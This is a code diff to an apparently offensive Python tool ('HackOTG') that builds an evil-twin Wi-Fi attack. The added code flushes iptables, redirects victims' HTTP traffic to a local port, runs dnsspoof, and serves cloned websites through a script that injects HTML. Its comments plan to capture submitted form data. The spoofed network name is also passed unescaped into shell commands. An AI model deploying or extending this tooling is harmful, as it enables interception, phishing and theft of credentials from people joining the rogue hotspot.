@@ -292,17 +292,31 @@ answer=input()
 print("")
 
 #folliwing all in one commnad? popeeN?
-#TODO start op server 
-#TODO start up dnsspoof
-
 #start up hostapd with all the settings (maybe bssid) -> use external script 
 #TODO more spoofing options?
-p = Popen("sh /home/pi/HackOTG/hotspot_start.sh "+spoof_essid+" && sudo dnsspoof -i wlan0 port 53&", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+
+#reroute
+p = Popen("sudo iptables -F && sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 9000", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+for line in p.stdout.read().splitlines():
+    if debug: 
+        print("[DEBUG]"+line.decode("utf-8"))
+#setup inject.html
+p = Popen("rm tmp/inject.html && touch tmp/inject.html", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+for line in p.stdout.read().splitlines():
+    if debug: 
+        print("[DEBUG]"+line.decode("utf-8"))
+#setup SERVE folder
+p = Popen("rm -Rf tmp/SERVE && mkdir tmp/SERVE && cp copied_sites/"+spoof_essid+".AP/* tmp/SERVE/", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+for line in p.stdout.read().splitlines():
+    if debug: 
+        print("[DEBUG]"+line.decode("utf-8"))
+
+p = Popen("sh /home/pi/HackOTG/hotspot_start.sh "+spoof_essid+" && sudo dnsspoof -i wlan0 port 53 1>/dev/null 2>/dev/null& && nodejs serve_inject_spoof.js tmp/SERVE/ tmp/inject.html", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
 for line in iter(p.stdout.readline, ""):
         print('\r'+line[:-1].decode("utf-8"))
 
+#TODO serve and inject script extend with all the possible POST GET, ... and extract 
 #TODO get the info lines as it is coming in
 #TODO loop through multiple??? and change attack vectors??? constantly?
 
 #TODO trap if quit that cleans up all processes
-
